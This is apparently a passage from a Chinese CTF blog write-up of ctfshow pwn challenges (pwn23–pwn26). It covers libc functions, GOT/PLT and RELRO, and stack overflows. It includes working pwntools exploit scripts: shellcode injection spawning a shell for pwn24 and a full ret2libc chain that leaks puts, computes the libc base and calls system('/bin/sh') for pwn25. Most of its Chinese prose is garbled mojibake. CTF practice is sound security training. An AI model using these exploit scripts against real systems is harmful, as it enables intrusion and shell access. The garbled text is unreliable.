</span></span><span class="line"><span class="cl"><span class="n">setvbuf</span><span class="p">:</span> <span class="err">Ëøô‰∏™ÂáΩÊï∞Áî®‰∫éËÆæÁΩÆÊñá‰ª∂ÊµÅÁöÑÁºìÂÜ≤Âå∫Á±ªÂûã„ÄÇÂÆÉÂÖÅËÆ∏Á®ãÂ∫èÂëòÊéßÂà∂Ê†áÂáÜ</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="err">Â∫ì‰∏≠Êñá‰ª∂ÊµÅÁöÑÁºìÂÜ≤ÊñπÂºè„ÄÇÈÄöÂ∏∏ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÊñá‰ª∂ÊµÅËÆæÁΩÆ‰∏∫Êó†ÁºìÂÜ≤„ÄÅË°åÁºìÂÜ≤ÊàñÂÖ®ÁºìÂÜ≤„ÄÇÂú®Ëøô‰∏™‰ª£Á†Å‰∏≠Ôºå</span><span class="n">setvbuf</span> <span class="err">ÂáΩÊï∞Ë¢´Áî®‰∫éËÆæÁΩÆ</span> <span class="n">_bss_start</span> <span class="err">ÂíåÊ†áÂáÜËæìÂÖ•ÊµÅ</span> <span class="n">stdin</span> <span class="err">ÁöÑÁºìÂÜ≤Á±ªÂûã‰∏∫Êó†ÁºìÂÜ≤ÔºåËøôÊÑèÂë≥ÁùÄÊØèÊ¨°ËæìÂá∫ÈÉΩ‰ºöÁ´ãÂç≥Ë¢´ÂÜôÂÖ•ÔºåËÄå‰∏ç‰ºöÂÖàÁºìÂ≠òÂú®ÂÜÖÂ≠ò‰∏≠„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">strcpy</span><span class="p">:</span> <span class="err">Ëøô‰∏™ÂáΩÊï∞Áî®‰∫éÂ∞Ü‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Â§çÂà∂Âà∞Âè¶‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Êï∞ÁªÑ‰∏≠„ÄÇÂÆÉÊé•Âèó‰∏§‰∏™ÂèÇÊï∞ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÁõÆÊ†áÂ≠óÁ¨¶‰∏≤Êï∞ÁªÑÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÊ∫êÂ≠óÁ¨¶‰∏≤„ÄÇ</span><span class="n">strcpy</span> <span class="err">‰ºöÂ∞ÜÊ∫êÂ≠óÁ¨¶‰∏≤ÁöÑÂÜÖÂÆπÈÄê‰∏™Â≠óÁ¨¶Âú∞Â§çÂà∂Âà∞ÁõÆÊ†áÂ≠óÁ¨¶‰∏≤Êï∞ÁªÑ‰∏≠ÔºåÁõ¥Âà∞ÈÅáÂà∞Ê∫êÂ≠óÁ¨¶‰∏≤ÁöÑÁªìÊùüÁ¨¶</span> \<span class="mi">0</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts</span><span class="p">:</span> <span class="n">puts</span> <span class="err">ÂáΩÊï∞Áî®‰∫éÂêëÊ†áÂáÜËæìÂá∫ÊâìÂç∞Â≠óÁ¨¶‰∏≤ÔºåÂπ∂Âú®ÊúÄÂêéËá™Âä®Ê∑ªÂä†‰∏Ä‰∏™Êç¢Ë°åÁ¨¶</span> \<span class="n">n</span><span class="err">„ÄÇÂÆÉÊé•Âèó‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰Ωú‰∏∫ÂèÇÊï∞ÔºåÂπ∂Â∞ÜÂÖ∂ÊâìÂç∞Âà∞Ê†áÂáÜËæìÂá∫ÊµÅ‰∏≠„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">scanf</span><span class="p">:</span> <span class="err">Ëøô‰∏™ÂáΩÊï∞Áî®‰∫é‰ªéÊ†áÂáÜËæìÂÖ•ÊµÅ‰∏≠ËØªÂèñËæìÂÖ•„ÄÇÂÆÉÊé•ÂèóÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºåÁî®‰∫éÊåáÂÆöËæìÂÖ•ÁöÑÊ†ºÂºèÔºå‰ª•Âèä‰∏ÄÁ≥ªÂàóÊåáÂêëÂèòÈáèÁöÑÊåáÈíàÔºåÁî®‰∫éÂ≠òÂÇ®ËØªÂèñÂà∞ÁöÑÂÄº„ÄÇÂú®Ëøô‰∏™‰ª£Á†Å‰∏≠Ôºå</span><span class="n">scanf</span> <span class="err">Ë¢´Áî®‰∫é‰ªéÊ†áÂáÜËæìÂÖ•‰∏≠ËØªÂèñ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂπ∂Â∞ÜÂÖ∂Â≠òÂÇ®Âà∞</span> <span class="n">s2</span> <span class="err">Â≠óÁ¨¶Êï∞ÁªÑ‰∏≠„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">strcmp</span><span class="p">:</span> <span class="err">Ëøô‰∏™ÂáΩÊï∞Áî®‰∫éÊØîËæÉ‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÊòØÂê¶Áõ∏Á≠â„ÄÇÂÆÉÊé•Âèó‰∏§‰∏™Â≠óÁ¨¶‰∏≤‰Ωú‰∏∫ÂèÇÊï∞ÔºåÂπ∂ËøîÂõû‰∏Ä‰∏™Êï¥Êï∞ÂÄºÔºåÂ¶ÇÊûú‰∏§‰∏™Â≠óÁ¨¶‰∏≤Áõ∏Á≠âÂàôËøîÂõû</span><span class="mi">0</span><span class="err">ÔºåÂê¶ÂàôËøîÂõûÂÆÉ‰ª¨Á¨¨‰∏Ä‰∏™‰∏çÁõ∏Á≠âÂ≠óÁ¨¶ÁöÑ</span> <span class="n">ASCII</span> <span class="err">Â∑ÆÂÄº„ÄÇÂú®Ëøô‰∏™‰ª£Á†Å‰∏≠Ôºå</span><span class="n">strcmp</span> <span class="err">Áî®‰∫éÊØîËæÉ</span> <span class="n">s1</span> <span class="err">Âíå</span> <span class="n">s2</span> <span class="err">ÊòØÂê¶Áõ∏Á≠âÔºåÂ¶ÇÊûúÁõ∏Á≠âÂàôËøîÂõû</span><span class="mi">0</span><span class="err">ÔºåÁ®ãÂ∫èÂ∞ÜÊâßË°å</span> <span class="n">execve_func</span> <span class="err">ÂáΩÊï∞„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);:</span> <span class="err">Ëøô‰∏ÄË°åË∞ÉÁî®‰∫Ü</span> <span class="n">execve</span> <span class="err">ÂáΩÊï∞ÔºåÁî®‰∫éÊâßË°å‰∏Ä‰∏™Á®ãÂ∫è„ÄÇÂÆÉÊé•Âèó‰∏â‰∏™ÂèÇÊï∞ÔºåÂàÜÂà´ÊòØË¶ÅÊâßË°åÁöÑÁ®ãÂ∫èË∑ØÂæÑ„ÄÅÂèÇÊï∞ÂàóË°®ÂíåÁéØÂ¢ÉÂèòÈáèÂàóË°®„ÄÇÂú®ËøôÈáåÔºåÂÆÉÊâßË°å‰∫Ü</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">ÔºåÂπ∂‰º†ÈÄí‰∫Ü‰∏Ä‰∏™Á©∫ÁöÑÂèÇÊï∞ÂàóË°®ÂíåÁéØÂ¢ÉÂèòÈáèÂàóË°®ÔºåË°®Á§∫Ê≤°ÊúâÈ¢ùÂ§ñÁöÑÂèÇÊï∞ÂíåÁéØÂ¢ÉÂèòÈáè„ÄÇ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>IDAËΩ¨Êç¢Êï∞ÊçÆÔºöCÔºàËΩ¨Êç¢‰∏∫‰ª£Á†ÅÔºâ„ÄÅDÔºàËΩ¨Êç¢‰∏∫Êï∞ÊçÆÔºâ„ÄÅ<strong>A</strong>ÔºàËΩ¨Êç¢‰∏∫Â≠óÁ¨¶Ôºâ„ÄÅNÔºà‰∏∫Ê†áÁ≠æÈáçÂëΩÂêç)</p>
<p>checksecÊü•ÁúãÊñá‰ª∂‰ø°ÊÅØ</p>
<p>read()ËØªÂèñ</p>
<p>strcat()ËµãÂÄº</p>
<p>system()Ë∞ÉÁî®</p>
<p>echo&raquo;Âú®Êñá‰ª∂ÂêéÈù¢ËøΩÂä†ÂÜÖÂÆπ</p>
<p>echo&gt;Ë¶ÜÁõñÊñá‰ª∂</p>
<p>fork()ÂàõÂª∫‰∫ÜÂ≠êËøõÁ®ãÔºåfclose(_bss_star)ÂÖ≥Èó≠‰∫ÜËæìÂá∫ÊµÅÔºåÂç≥‰ΩøÂêéÈù¢ÂÜçËæìÂÖ•Ôºå‰πü‰∏ç‰ºöÊúâÂõûÊòæÔºåÂú®ÂëΩ‰ª§ÂêéÂä†‰∏ä&gt;&amp;0 ÔºåÂ∞ÜÂëΩ‰ª§ÁöÑËæìÂá∫ÈáçÂÆöÂêëÂà∞Ê†áÂáÜËæìÂÖ•Ôºå‰πüÂ∞±ÊòØÂ∞ÜÂëΩ‰ª§ÁöÑËæìÂá∫ÂÜÖÂÆπÂèëÈÄÅÂà∞‰∏éÁªàÁ´ØÊàñÈîÆÁõòÂÖ≥ËÅîÁöÑÂú∞Êñπ</p>
<p><img src="/p/ctfshow-pwn/image-20250301105308304.png"
	width="986"
	height="472"
	srcset="/p/ctfshow-pwn/image-20250301105308304_hu_24130e6f2b6edee8.png 480w, /p/ctfshow-pwn/image-20250301105308304_hu_1d58cb8119c4dd4a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="501px"
	
></p>
<h2 id="ÈìæÊé•ÈáçÂÆö‰Ωç">ÈìæÊé•ÈáçÂÆö‰Ωç
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.text
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Ë∞ÉÁî®printfÁöÑcallÊåá‰ª§
</span></span><span class="line"><span class="cl">call printf_stub
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">printf_stub:
</span></span><span class="line"><span class="cl">    mov rax, [printfÂáΩÊï∞ÁöÑÂÇ®Â≠òÂú∞ÂùÄ] // Ëé∑ÂèñprintfÈáçÂÆö‰Ωç‰πãÂêéÁöÑÂú∞ÂùÄ
</span></span><span class="line"><span class="cl">    jmp rax // Ë∑≥ËøáÂéªÊâßË°åprintfÂáΩÊï∞
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">.data
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">printfÂáΩÊï∞ÁöÑÂÇ®Â≠òÂú∞ÂùÄÔºö
</span></span><span class="line"><span class="cl">„ÄÄ„ÄÄËøôÈáåÂÇ®Â≠òprintfÂáΩÊï∞ÈáçÂÆö‰ΩçÂêéÁöÑÂú∞ÂùÄ
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn/image-20250301111550897.png"
	width="1925"
	height="942"
	srcset="/p/ctfshow-pwn/image-20250301111550897_hu_889f0352dea244c1.png 480w, /p/ctfshow-pwn/image-20250301111550897_hu_2777513017fd53fe.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="490px"
	
></p>
<p>.gotÂíå.got.pltÊòØÂê¶ÂèØÂÜô‰∏éRELROÊúâÂÖ≥ÔºåËøôÊòØlinuxÁ≥ªÁªü‰∏ãÂèØÊâßË°åÊñá‰ª∂ÁöÑ‰∏ÄÁßç‰øùÊä§Êú∫Âà∂ÔºåÂÆÉÁî®‰∫éÂ¢ûÂº∫Á®ãÂ∫èÁöÑÂÆâÂÖ®ÊÄßÔºåÁâπÂà´ÊòØÈíàÂØπÂÖ±‰∫´Â∫ìÁöÑÊîªÂáª„ÄÇRELROÊú∫Âà∂ÈÄöËøáÂ∞ÜÈÉ®ÂàÜELFÊÆµÊ†áËÆ∞‰∏∫Âè™ËØªÔºåÈò≤Ê≠¢ÊîªÂáªËÄÖÂà©Áî®ÂÖ®Â±ÄÂÅèÁßªË°®ÔºàGOTÔºâÂíåËøáÁ®ãÈìæÊé•Ë°®ÔºàPLTÔºâËøõË°åÊîªÂáª„ÄÇËßÑÂÆöÂ¶Ç‰∏ãÔºö</p>
<p>ÂΩìRELRO‰∏∫Partial RELROÊó∂ÔºåË°®Á§∫.got‰∏çÂèØÂÜôËÄå.got.pltÂèØÂÜô„ÄÇ
ÂΩìRELRO‰∏∫FullRELROÊó∂ÔºåË°®Á§∫.got‰∏çÂèØÂÜô.got.plt‰πü‰∏çÂèØÂÜô„ÄÇ
ÂΩìRELRO‰∏∫No RELROÊó∂ÔºåË°®Á§∫.got‰∏é.got.pltÈÉΩÂèØÂÜô„ÄÇ</p>
<p>ÂèØ‰ª•ÈÄöËøáchecksecÂëΩ‰ª§Êù•Ëé∑ÂèñÂèØÊâßË°åÊñá‰ª∂ÁöÑÈÉ®ÂàÜ‰øùÊä§Êú∫Âà∂‰ø°ÊÅØ„ÄÇ</p>
<p>ÂèØ‰ª•ÈÄöËøáreadelf -SÂëΩ‰ª§Êü•ÁúãÊñá‰ª∂ÁöÑÂêÑ‰∏™ÊÆµÁöÑËØ¶ÁªÜ‰ø°ÊÅØÔºåÂÖ∂‰∏≠Â∞±ÂåÖÊã¨‰∫Ü.gotÂíå.got.pltË°®ÁöÑÂú∞ÂùÄ
Áî®objdump -h pwnÂëΩ‰ª§Êü•ÁúãelfÂ§¥‰ø°ÊÅØÔºåVMAÂç≥Âú∞ÂùÄÔºàËôöÊãüÂú∞ÂùÄÂíåÁâ©ÁêÜÂú∞ÂùÄÁõ∏Âêå)</p>
<p><img src="/p/ctfshow-pwn/image-20250301114121781.png"
	width="1577"
	height="165"
	srcset="/p/ctfshow-pwn/image-20250301114121781_hu_84c5c4b6da376986.png 480w, /p/ctfshow-pwn/image-20250301114121781_hu_57dfcf1928e9cffc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="955"
		data-flex-basis="2293px"
	
></p>
<p><img src="/p/ctfshow-pwn/image-20250301120546826.png"
	width="849"
	height="234"
	srcset="/p/ctfshow-pwn/image-20250301120546826_hu_f8e3bffebad7a395.png 480w, /p/ctfshow-pwn/image-20250301120546826_hu_c1a9a1778567c1a7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="362"
		data-flex-basis="870px"
	
></p>
<p>Âè™Ë¶Å‰º†ÂèÇsrcÔºåÈïøÂ∫¶Â§ß‰∫é0x3Eh+0x4Â∞±‰ºöÂèëÁîüÊ∫¢Âá∫,‰ΩøÁî®./(file)‰º†ÂèÇ</p>
<p><img src="/p/ctfshow-pwn/image-20250301121340085.png"
	width="2351"
	height="535"
	srcset="/p/ctfshow-pwn/image-20250301121340085_hu_1941c3b1326ec9f6.png 480w, /p/ctfshow-pwn/image-20250301121340085_hu_e3e6ead405c9cb03.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="439"
		data-flex-basis="1054px"
	
></p>
<h2 id="pwn24">pwn24
</h2><p><img src="/p/ctfshow-pwn/image-20250301121820857.png"
	width="2116"
	height="826"
	srcset="/p/ctfshow-pwn/image-20250301121820857_hu_3642defef2f453aa.png 480w, /p/ctfshow-pwn/image-20250301121820857_hu_b6554968a049d145.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="614px"
	
></p>
<p>Ë∞ÉÁî®readÂáΩÊï∞ÔºåËØªÂèñËæìÂÖ•ÔºåÂ≠òÂÖ•[ebp+buf]‰∏≠Ôºålea eax [ebp+buf]ÊääÂú∞ÂùÄÂ≠òÂÖ•eax‰∏≠ÔºåÁÑ∂ÂêéÔºåcall eaxÊâßË°å</p>
<p><img src="/p/ctfshow-pwn/image-20250301122519477.png"
	width="1228"
	height="361"
	srcset="/p/ctfshow-pwn/image-20250301122519477_hu_18eac2c99a8f1809.png 480w, /p/ctfshow-pwn/image-20250301122519477_hu_7bfd7934d6c921b4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="340"
		data-flex-basis="816px"
	
></p>
<p>NXÊòØdisablesÔºåËØ¥ÊòéÂèØ‰ª•Áî®shellcodeËøõË°åÊîªÂáª</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
</span></span><span class="line"><span class="cl">p=remote(&#34;pwn.challenge.ctf.show&#34;,28284)#‰∏éÊúçÂä°Âô®ÁöÑpwnÊñá‰ª∂Âª∫Á´ãËÅîÁ≥ª
</span></span><span class="line"><span class="cl">shell=asm(shellcraft.sh())#Âà©Áî®shellcraftÊ®°ÂùóÁîüÊàêË∞ÉÁî®Á≥ªÁªüshellÔºà/bin/shÔºâÁöÑshellcode„ÄÇËøô‰∏™shellcodeÂèØ‰ª•Áî®‰∫éÊâßË°åÂëΩ‰ª§Ë°åÂëΩ‰ª§
</span></span><span class="line"><span class="cl">p.sendline(shell)#ÂêëËøúÁ®ãÂèëÈÄÅshellcode
</span></span><span class="line"><span class="cl">p.interactive()#Âª∫Á´ã‰∫§‰∫íÂºèÂØπËØù
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞±Ëé∑ÂæóÊéßÂà∂Âè∞ÊùÉÈôê‰∫Ü</p>
<h2 id="pwn25">pwn25
</h2><p>ret2libc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28162</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># payloadÔºö0x88+0x4‰∏™Êó†Áî®Â°´ÂÖÖÂ≠óÁ¨¶Ë¶ÜÁõñÂà∞ËøîÂõûÂú∞ÂùÄÔºå</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Â∞ÜputsÂáΩÊï∞pltË°®Âú∞ÂùÄÂÅöËøîÂõûÂú∞ÂùÄÔºå‰ª£Ë°®ctfshowÂáΩÊï∞ÊâßË°åÂÆå‰ºöÊâßË°åputsÂáΩÊï∞Ôºå</span>
</span></span><span class="line"><span class="cl"><span class="c1"># main_addrÊòØputsÂáΩÊï∞ÊâßË°åÂÆåÂêéÁöÑËøîÂõûÂú∞ÂùÄÔºå‰ΩøÁî®putsÂáΩÊï∞ÊâßË°åÂÆåÂêéÂõûÂà∞mainÂáΩÊï∞ÁªßÁª≠Âà©Áî®Ê∫¢Âá∫ÊºèÊ¥û</span>
</span></span><span class="line"><span class="cl"><span class="c1"># putsÂáΩÊï∞gotË°®‰∏≠ÁöÑÂú∞ÂùÄ‰Ωú‰∏∫putsÂáΩÊï∞ÊâßË°åÁöÑÂèÇÊï∞ÔºåËÆ©putsÂáΩÊï∞ËæìÂá∫putsÂáΩÊï∞Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Êé•Êî∂putsÂáΩÊï∞ËæìÂá∫ÁöÑputsÂáΩÊï∞Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Âú®Ê†πÊçÆÂÜÖÂ≠ò‰∏≠putsÂáΩÊï∞ÁöÑÂú∞ÂùÄÂØªÊâæÁõ∏Â∫îÁöÑlibcÁâàÊú¨‰∏≠putsÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÊâæÂà∞libc‰∏≠ÁöÑputsÂáΩÊï∞Âú∞ÂùÄ‰πãÂêéÔºåÂ∞ÜÂÜÖÂ≠òÁöÑputsÂáΩÊï∞Âú∞ÂùÄÂáèÂéªlibc‰∏≠ÁöÑputsÂáΩÊï∞Âú∞ÂùÄÂ∞±ÂæóÂà∞‰∫ÜlibcÁöÑÂü∫Âú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ‰ΩøÁî®libc.dump(&#34;system&#34;)ÊâæÂà∞libc‰∏≠ÁöÑsystemÂáΩÊï∞Âú∞ÂùÄÔºåÂÜçÂä†‰∏äÂü∫Âú∞ÂùÄÂ∞±ÂæóÂà∞systemÂáΩÊï∞Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ‰ΩøÁî®libc.dump(&#34;str_bin_sh&#34;)ÊâæÂà∞libc‰∏≠ÁöÑ&#34;/bin/sh&#34;Â≠óÁ¨¶‰∏≤Âú∞ÂùÄÔºåÂÜçÂä†‰∏äÂü∫Âú∞ÂùÄÂ∞±ÂæóÂà∞&#34;/bin/sh&#34;Â≠óÁ¨¶‰∏≤Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># payloadÔºöÂ°´ÂÖÖÊ†àÁ©∫Èó¥Âà∞ËøîÂõûÂú∞ÂùÄÔºåÂ∞ÜËøîÂõûÂú∞ÂùÄË¶ÜÁõñ‰∏∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÁÑ∂ÂêéÂ°´ÂÖÖÊâßË°åsystemÂáΩÊï∞‰πãÂêéÁöÑËøîÂõûÂú∞ÂùÄÔºåÂ°´ÂÖÖ‰ªÄ‰πàÈÉΩÂèØ‰ª•Ôºå‰ΩÜÊòØÈïøÂ∫¶ÂøÖÈ°ª‰∏∫4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÊúÄÂêéÂ°´ÂÖ•systemÁöÑÂèÇÊï∞‚Äú/bin/sh‚Äù</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn26">pwn26
</h2><p><img src="/p/ctfshow-pwn/image-20250301151646333.png"
	width="1714"
	height="821"
	srcset="/p/ctfshow-pwn/image-20250301151646333_hu_30239d4119899274.png 480w, /p/ctfshow-pwn/image-20250301151646333_hu_5672cec098e110ab.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="501px"
	
></p>
